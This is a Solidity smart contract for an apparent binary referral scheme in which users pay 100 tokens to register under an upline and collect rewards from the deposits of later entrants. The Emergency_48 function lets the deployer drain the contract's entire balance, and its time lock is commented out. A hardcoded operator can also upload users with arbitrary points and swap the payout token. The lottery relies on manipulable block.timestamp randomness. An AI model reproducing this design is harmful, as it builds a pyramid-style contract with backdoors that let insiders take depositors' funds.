// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.4.22 <0.9.0;
import "./Smart_Binary.sol";
contract Smart_Binance is Context {
    using SafeERC20 for IERC20; struct SEP { uint24 LD; uint24 RD; uint8 TCP; uint16 DP; uint8 CH; uint8 OR; address UPA; address LDA; address RDA; }
    mapping(address => SEP) private _XB; mapping(uint128 => address) private JK; mapping(uint16 => address) private _DUP;
    address[] private EW; address[] private _PY; address[] private _X_N; uint32[] private _RNN; uint256 private LSR;
    uint256 private LRF; uint256 private V_F; uint128 private _U_Z; uint128 private ZA_D; uint64 private _CF; uint64 private _CU_PY;
    uint16 private _DUPId; uint8 private Lk; uint8 private Count_Upload; uint8 C_G; address private R_S; address private SBT;
    IERC20 private S_Coin; string private Note; string private IPFS; Smart_Binary private Nobj;
    constructor() {R_S = _msgSender(); LSR = block.timestamp;
        S_Coin = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        SBT = 0x4DB1B84d1aFcc9c6917B5d5cF30421a2f2Cab4cf;
        Nobj = Smart_Binary(0x3164B3841D2b603ddB43C909C7f6Efd787058541); }
    function Reward_12() public {require(Lk == 0, "Proccesing");
        require(_XB[_msgSender()].TCP > 0, "You dont have point" );
     // require( block.timestamp > LSR + 12 hours, "Reward_12 time has not come" );
        Lk = 1; uint256 ZZ = (PRP() * 90) - (Total_Point() * 10**18); V_F = (PRP() * 10);
        uint256 QA = ((ZZ)) / Total_Point(); uint128 R_C = (Total_Point()) * 10**18;
        for(uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)) { SEP memory T_DE = _XB[JK[i]];
        uint24 Pnt; uint24 RLT = T_DE.LD <= T_DE.RD ? T_DE.LD : T_DE.RD;
        if (RLT > 0) {if (RLT > 25) {Pnt = 25; if (T_DE.LD < RLT) { T_DE.LD = 0; T_DE.RD -= RLT;} 
        else if (T_DE.RD < RLT) {T_DE.LD -= RLT; T_DE.RD = 0;} else {T_DE.LD -= RLT; T_DE.RD -= RLT;}} else {Pnt = RLT; 
        if (T_DE.LD < Pnt) {T_DE.LD = 0; T_DE.RD -= Pnt;} else if (T_DE.RD < Pnt) { T_DE.LD -= Pnt; T_DE.RD = 0;} 
        else {T_DE.LD -= Pnt; T_DE.RD -= Pnt;}} T_DE.TCP = 0; _XB[JK[i]] = T_DE;
        if (Pnt * QA > S_Coin.balanceOf(address(this))) {S_Coin.safeTransfer(JK[i],S_Coin.balanceOf(address(this)));} 
        else {S_Coin.safeTransfer( JK[i], Pnt * QA);}_PY.push(JK[i]); _CU_PY++;} } LSR = block.timestamp;
        if (R_C <= S_Coin.balanceOf(address(this))) {S_Coin.safeTransfer(_msgSender(), R_C);} Lk = 0; C_G = 1; LRF = block.timestamp;}
    function Register(address upline) public {require( _XB[upline].CH != 2,"Upline has two directs!" );
        require(_msgSender() != upline, "You can not enter your address!");
        bool UU = false; for(uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)) {if (JK[i] == _msgSender()) { UU = true; break;}} require(UU == false, "You were registered!");
        bool WH = false; for(uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)) {if (JK[i] == upline) { WH = true; break;}} require(WH == true, "Upline is not exist!");
        S_Coin.safeTransferFrom( _msgSender(), address(this), 100 * 10**18 ); JK[_U_Z] = _msgSender(); _U_Z++;
        uint16 DPCh = _XB[upline].DP + 1; _XB[_msgSender()] = SEP( 0, 0, 0, DPCh, 0, _XB[upline].CH, upline, address(0), address(0) );
        if (_XB[upline].CH == 0) { _XB[upline].LD++; _XB[upline].LDA = _msgSender();} else {_XB[upline].RD++; _XB[upline].RDA = _msgSender(); } _XB[upline].CH++; setTDP(upline);
        address UPN = _XB[upline].UPA; address ChNde = upline; for( uint128 j = 0; j < _XB[upline].DP; j = unsafe_inc(j)){ 
        if (_XB[ChNde].OR == 0) { _XB[UPN].LD++; } else { _XB[UPN].RD++; } setTDP(UPN); ChNde = UPN; UPN = _XB[UPN].UPA;}}
    function Gift_3() public {require(C_G == 1,"Gift_3 time has not come!" );
        require(block.timestamp > LRF + 1 hours, "Gift_3 time has not come" );
        require(V_F > 20*10**18, "Gift balance is not enough!" );
        require(_CF > 0, "There is no candidate!" );
        bool II = false; for(uint128 i = 0; i < _CF; i = unsafe_inc(i)) {if (EW[i] == _msgSender()) { II = true; break;}}
        require(II == true, "You are not candidated!"); S_Coin.safeTransfer(_msgSender(),10 * 10**18 );
        uint256 NW = ((V_F - 10*10**18) / 10**18) / 10; if (NW != 0 && _CF != 0) {if (_CF > NW) {
        for(uint32 i = 1; i <= _CF; i++ ) {_RNN.push(i);} for(uint128 i = 1; i <= NW; i = unsafe_inc(i)) {
        uint256 randomIndex = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, i))) % _CF;
        uint128 RSN = _RNN[randomIndex]; _RNN[randomIndex] = _RNN[ _RNN.length - 1 ]; _RNN.pop();
        if(_XB[EW[RSN - 1]].TCP == 0){ S_Coin.safeTransfer(EW[RSN - 1], 10 * 10**18 );}}
        for(uint128 i = 0; i < (_CF - NW); i = unsafe_inc(i)) {_RNN.pop();}} else { for ( uint128 i = 0; i < _CF; i = unsafe_inc(i))
        {S_Coin.safeTransfer(EW[i], 10 * 10**18 );}}} delete EW; _CF = 0; V_F = 0; C_G = 0; delete _PY; _CU_PY=0;}
    function Smart_Gift() public { require(C_G == 1,"Smart_Gift time has not come!" );
        bool UPY = false; for(uint128 i = 0; i < _CU_PY; i = unsafe_inc(i)) {if (_PY[i] == _msgSender()) { UPY = true; break;}}  require(UPY == false, "You have point!");
        bool UU = false; for(uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)) {if (JK[i] == _msgSender()) { UU = true; break;}}
        require(UU == true, "You are not registered!" );
        bool II = false; for(uint128 i = 0; i < _CF; i = unsafe_inc(i)) {if (EW[i] == _msgSender()) { II = true; break;}}
        require(II == false, "You were candidated!");
        require(((((V_F - 10*10**18) / 10**18) / 10)*2) > (_CF), "Capacity is completed!"); EW.push(_msgSender()); _CF++;}
    function Emergency_48() public {require(_msgSender() == R_S, "You can not write!");
     // require(block.timestamp > LSR + 48 hours, "Emergency_48 time has not come" );
        S_Coin.safeTransfer(R_S, S_Coin.balanceOf(address(this)) ); }
    function Buy_SBT() public {require(IERC20(SBT).balanceOf(_msgSender()) >= (10 * 10**18), "You dont have enough S_Coin!" );
        S_Coin.safeTransferFrom(_msgSender(),address(this), 10 * 10**18 ); IERC20(SBT).transfer(_msgSender(), 100 * 10**18);}
      function Get_SBT() public {bool CC = false; for (uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)) {if (JK[i] == _msgSender()) { CC = true; break;}}
        require(CC == true, "You are not registered!" );
        bool TAU = false; for (uint128 i = 0; i < ZA_D; i = unsafe_inc(i)) {if (_X_N[i] == _msgSender()) { TAU = true; break;}}
        require(TAU == false,"You can not receive SBT again!"); IERC20(SBT).transfer(_msgSender(), 100 * 10**18); _X_N.push(_msgSender()); ZA_D++;}
    function Import (address User ) public {
        bool UU = false; for(uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)) {if (JK[i] == User) { UU = true; break;}} require(UU == false, "You were registered!");
        bool TDUP = false; for(uint16 i = 0; i <= _DUPId; i++) {if (_DUP[i] == User) { TDUP = true; break;}} require(TDUP == false, "You were uploaded!");
        JK[_U_Z] = User; _XB[JK[_U_Z]] = SEP( 
          uint24(Nobj.User_Information(User).leftDirect),
          uint24(Nobj.User_Information(User).rightDirect), 0,
          uint16(Nobj.User_Information(User).depth),
          uint8(Nobj.User_Information(User).childs),
          uint8(Nobj.User_Information(User).leftOrrightUpline),
        Nobj.User_Information(User).UplineAddress,
        Nobj.User_Information(User).leftDirectAddress,
        Nobj.User_Information(User).rightDirectAddress ); _U_Z++; }
    function Upload (address user, uint24 L, uint24 R, uint16 DeP, uint8 CHs, uint8 LoR, address UAd, address LAd, address RAd ) 
    public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!");
    require(Count_Upload <= 150, "Its over!"); JK[_U_Z] = user; _XB[JK[_U_Z]] = SEP( L, R, 0, DeP, CHs, LoR, UAd, LAd, RAd ); _U_Z++; Count_Upload++; }
    function _S_Coin(address add) public{ require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); S_Coin = IERC20(add);}
    function PRP() private view returns (uint256) { return (S_Coin.balanceOf(address(this))) / 100;}
    function setTDP(address Q) private {uint24 min = _XB[Q].LD <= _XB[Q].RD ? _XB[Q].LD : _XB[Q].RD; if (min > 0) { _XB[Q].TCP = uint8(min); } }
    function unsafe_inc(uint128 x) private pure returns (uint128) { unchecked { return x + 1; } }
    function Add_DUP(address add) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); _DUP[_DUPId] = add; _DUPId++;}
    function Write_Note(string memory N) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); Note = N; }
    function Write_IPFS(string memory N) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just operator can write!"); IPFS = N; }
    function User_Info(address User) public view returns (SEP memory) {return _XB[User]; }
    function Contract_Balance() public view returns (uint256) { return (S_Coin.balanceOf(address(this)) - V_F) / 10**18;}
    function Reward_12_Writer () public view returns (uint256) { return Total_Point();}
    function Reward_Balance () public view returns (uint256) {if(C_G == 1){ return (((S_Coin.balanceOf(address(this)) - V_F)/100)*90) / 10**18; } else{ return (PRP() * 90) / 10**18; } }
    function Gift_Balance() public view returns (uint256) {if(C_G == 1){ return V_F / 10**18; } else{ return (PRP() * 10) / 10**18; } }
    function Gift_Candidate() public view returns (uint256) {return _CF; }
    function All_Register() public view returns (uint256) {return _U_Z; }
    function User_Upline(address User) public view returns (address) { return _XB[User].UPA; }
    function User_Directs(address User) public view returns (address, address) { return (_XB[User].LDA, _XB[User].RDA ); }
    function User_Left_Right(address User) public view returns (uint256, uint256) { return ( _XB[User].LD, _XB[User].RD ); }
    function Total_Point () public view returns (uint128) { uint128 TPnt; for (uint128 i = 0; i <= _U_Z; i = unsafe_inc(i)){
    uint32 min = _XB[JK[i]].LD <= _XB[JK[i]].RD ? _XB[JK[i]].LD : _XB[JK[i]].RD; if (min > 25) { min = 25; } TPnt += min; } return TPnt; }
    function Value_Point() public view returns (uint256) {if (Total_Point() == 0) {return Reward_Balance(); } else { return ((Reward_Balance ()) - (Total_Point())) / (Total_Point());} }
    function Read_Note() public view returns (string memory) { return Note; }
    function Read_IPFS() public view returns (string memory) { return IPFS; } 
    function Gift_3_Writer() public view returns (uint256){ if(V_F > 20*10**18){ return 10; } else{ return 0;}}}